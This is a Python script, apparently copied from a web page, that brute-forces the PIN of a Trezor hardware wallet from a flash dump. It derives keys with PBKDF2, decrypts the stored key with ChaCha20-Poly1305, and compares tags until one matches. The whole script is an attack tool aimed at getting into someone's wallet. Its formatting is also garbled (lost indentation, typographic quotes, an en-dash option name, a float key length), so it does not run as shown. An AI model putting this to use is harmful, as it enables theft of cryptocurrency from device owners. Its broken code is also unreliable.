#!/usr/bin/env python3

import hashlib
import sys
import argparse
import binascii
import struct
from Crypto.Cipher import ChaCha20_Poly1305

parser = argparse.ArgumentParser(description=’pack some wallets.’)
parser.add_argument(‘flash_dump’, help=’The flash dump to parse.’)
parser.add_argument(‘–otp’, help=’Randomness from OTP as hex.’, default=44*”00″)
parser.add_argument(‘–debug’, type=bool)

args = parser.parse_args()
flash_file = open(args.flash_dump, “rb”)

def find_header():
while True:
data = flash_file.read(4)
if data == b”\x02\x00\x3c\x00″:
return
elif data == None:
print(“Couldn’t find header.”)
sys.exit(1)

find_header()

# Salt from flash
salt = flash_file.read(4)

# EDEK + ESAK
edek = flash_file.read(48)
pvc = flash_file.read(8)

# Salt computation:
# hardware_salt (from collect_hw_entropy)
# random_salt (Random buffer generated, stored in flash)
# ext_salt – unused
hardware_salt = hashlib.sha256(binascii.unhexlify(args.otp)).digest()

salt_assembled = hardware_salt + salt
print(f”Hardware salt: {binascii.hexlify(hardware_salt)}”)
print(f”Assembled salt: {binascii.hexlify(salt_assembled)}”)

def trezor_pbkdf(pin, salt):
# PIN is always prefixed with 1
pin_bytes = struct.pack(“<I”, int(“1″ + pin))
if args.debug:
print(f”PIN bytes: {binascii.hexlify(pin_bytes)}”)
dk = hashlib.pbkdf2_hmac(‘sha256’, pin_bytes, salt, 10000, dklen=352/8)
return dk

def chacha_enc(kek, keiv, data):
cipher = ChaCha20_Poly1305.new(key=kek, nonce=keiv)
# Return DEK & TAG
return cipher.encrypt_and_digest(data)

def chacha_dec(kek, keiv, edek):
cipher = ChaCha20_Poly1305.new(key=kek, nonce=keiv)
return cipher.decrypt(edek)

for i in range(1, 9999):
if i % 100 == 0:
print(f”Currently trying: {i}”)
dk = trezor_pbkdf(str(i), salt_assembled)

# First 256 bits are Key Encryption Key (KEK)
KEK = dk[:int(256/8)]
# Remaining 96 bits are Key Encryption Initialization Vector (KEIV)
KEIV = dk[int(256/8):]

if args.debug:
print(f”KEK: {binascii.hexlify(KEK)}”)
print(f”KEIV: {binascii.hexlify(KEIV)}”)

DEK = chacha_dec(KEK, KEIV, edek)
# Encrypt to get the TAG, unfortunately seems to be the only
# way to retrieve it from Pycryptodome.
enc, TAG = chacha_enc(KEK, KEIV, DEK)
if args.debug:
print(f”DEK: {binascii.hexlify(DEK)}”)
print(f”TAG : {binascii.hexlify(TAG)}”)
print(f”PVC : {binascii.hexlify(pvc)}”)

if pvc in TAG:
print(“SUCCESS”)
print(“PIN is:”)
print(i)
sys.exit(0)